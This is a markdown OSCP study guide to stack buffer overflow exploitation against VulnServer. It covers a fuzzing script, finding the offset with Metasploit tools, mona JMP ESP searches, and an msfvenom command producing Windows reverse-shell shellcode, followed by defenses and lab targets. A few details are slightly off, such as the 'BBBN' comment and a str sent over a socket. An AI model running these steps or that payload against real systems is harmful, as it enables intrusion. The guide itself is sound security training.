# Buffer Overflow Exploitation

Buffer overflows are critical vulnerabilities that occur when a program writes more data to a buffer than it can hold. This guide covers the essentials for OSCP.

## üìã Table of Contents
1. [Basics](#basics)
2. [Exploit Development](#exploit-development)
3. [Defenses](#defenses)
4. [Tools](#-tools)
5. [Resources](#-resources)

## Basics
- **Buffer**: Memory block for data storage
- **Stack**: Stores function calls and local variables
- **EIP**: Extended Instruction Pointer - controls execution flow
- **ESP**: Extended Stack Pointer - points to the top of the stack

## Exploit Development

### 1. Fuzzing
```python
import socket
buffer = "A" * 100
while True:
    try:
        s = socket.socket()
        s.connect(('192.168.1.100', 9999))
        s.send(('TRUN /.:/' + buffer))
        buffer += "A" * 100
    except:
        print(f"Crashed at {len(buffer)} bytes")
        break
```

### 2. Find Offset
```bash
# Generate pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000

# Find offset after crash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337
```

### 3. Control EIP
```python
offset = "A" * 2003
eip = "\x42\x42\x42\x42"  # BBBN
buffer = offset + eip
```

### 4. Find Bad Characters
```python
badchars = ("\x01\x02\x03...\xfe\xff")  # All chars except null byte
# Send and check memory dump for corruption
```

### 5. Find JMP ESP
```
!mona modules
!mona find -s "\xff\xe4" -m "essfunc.dll"
```

### 6. Generate Shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f c -b "\x00"
```

## Defenses
- **DEP**: Prevents execution from data pages
- **ASLR**: Randomizes memory addresses
- **Stack Canaries**: Detects stack smashing
- **SafeSEH**: Protects exception handlers
- **CFG**: Validates function calls

## üõ† Tools
- Immunity Debugger with Mona
- msfvenom
- pattern_create/offset
- gdb (Linux)
- OllyDbg

## üìö Resources
- [FuzzySecurity Guide](https://www.fuzzysecurity.com/tutorials/expDev/1.html)
- [Corelan Tutorial](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
- [OSCP Buffer Overflow Prep](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
- [OffSec Buffer Overflow](https://www.offensive-security.com/student-forum/threads/offsecs-buffer-overflow-primer.110/)

## ‚ö†Ô∏è Practice
1. Try the [VulnServer](https://github.com/stephenbradshaw/vulnserver)
2. Practice with [Brainpan](https://www.vulnhub.com/entry/brainpan-1,51/)
3. Test with [SLMail](https://www.exploit-db.com/exploits/638)

Remember to practice in a controlled environment with proper authorization.
